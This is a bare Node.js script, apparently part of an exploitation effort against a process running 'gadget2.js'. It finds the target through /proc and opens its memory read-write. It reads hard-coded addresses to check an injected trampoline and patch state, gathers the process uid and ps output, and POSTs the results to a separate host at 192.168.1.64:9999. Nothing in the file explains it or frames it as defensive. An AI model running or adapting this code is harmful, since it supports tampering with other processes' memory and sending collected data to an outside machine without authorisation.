"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        { host: HOST, port: PORT, path: path, method: "POST",
          headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.ps = run("ps -ef 2>&1 | grep -v grep | grep -iE 'node|gadget' | head -20");

/* find our uid-5001 node processes via /proc cmdline */
var pids = [];
try {
    var dirs = fs.readdirSync("/proc");
    for (var i = 0; i < dirs.length; i++) {
        var d = dirs[i];
        if (!/^[0-9]+$/.test(d)) continue;
        try {
            var cmdl = fs.readFileSync("/proc/" + d + "/cmdline", "utf8");
            if (cmdl.indexOf("gadget2.js") >= 0) pids.push(d);
        } catch (e) {}
    }
} catch (e) { out.procscan_err = "" + e; }
out.gadget_pids = pids;

if (pids.length > 0) {
    var pid = pids[0];
    out.pid = pid;
    try {
        var mem = fs.openSync("/proc/" + pid + "/mem", "r+");
        function readMem(addr, len) { var b = new Buffer(len); fs.readSync(mem, b, 0, len, addr); return b; }
        var tailptr = readMem(0x9befe0, 4).readUInt32LE(0);
        out.tailptr = "0x" + tailptr.toString(16);
        if (tailptr) {
            var st = readMem(tailptr + 0x800, 16);
            out.st_phase = st.readUInt32LE(0);
            out.st_hits = st.readUInt32LE(4);
            out.st_ioctl = st.readUInt32LE(8);
            out.st_lastphys = "0x" + st.readUInt32LE(12).toString(16);
        }
        /* check whether the trampoline code is still at 0x9bed50 and site patch state */
        var tr = readMem(0x9bed50, 16);
        out.tramp_head = tr.toString("hex");
        var sa = readMem(0x7aef1c, 4);
        out.site_a = sa.toString("hex");
        /* uid of the stuck process */
        var st2 = fs.readFileSync("/proc/" + pid + "/status", "utf8");
        var m = st2.match(/^(Uid:.*)$/m);
        out.uid_line = m ? m[1] : "n/a";
        fs.closeSync(mem);
    } catch (e) {
        out.memread_err = "" + (e.stack ? e.stack : e);
    }
    /* leave it running for now; just observe */
}

post("/audit21", out);
